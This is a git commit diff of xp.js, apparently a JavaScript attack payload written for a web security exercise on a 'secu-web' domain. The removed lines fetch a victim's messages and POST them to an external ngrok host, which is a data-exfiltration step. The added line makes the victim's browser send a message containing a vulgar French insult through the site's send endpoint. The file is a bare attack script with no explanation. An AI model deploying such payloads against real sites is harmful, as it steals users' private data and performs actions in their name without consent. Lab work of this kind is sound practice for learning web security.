71c7d99e0c8f8e8776b64704ae66f48b0d3b4e33
DELLA GIUSTA Jean-Christophe <49980558+seeQuayah@users.noreply.github.com>
2022-11-25 17:46:11 +0100

    Update xp.js

--- xp.js
+++ xp.js
@@ -1,12 +1,4 @@
 const Http = new XMLHttpRequest();
-const url='whatsup.secu-web.blackfoot.dev/messages/1';
+const url='whatsup.secu-web.blackfoot.dev/send_it?id=343&content="fdp t mor';
 Http.open("GET", url, false);
 Http.send(null);
-
-const res = Http.responseText;
-
-const url2='https://aed2-2a01-e0a-ee-4c0-bb28-4536-56a7-41f.eu.ngrok.io';
-
-Http.open("POST", url2, false);
-Http.send(res);
-
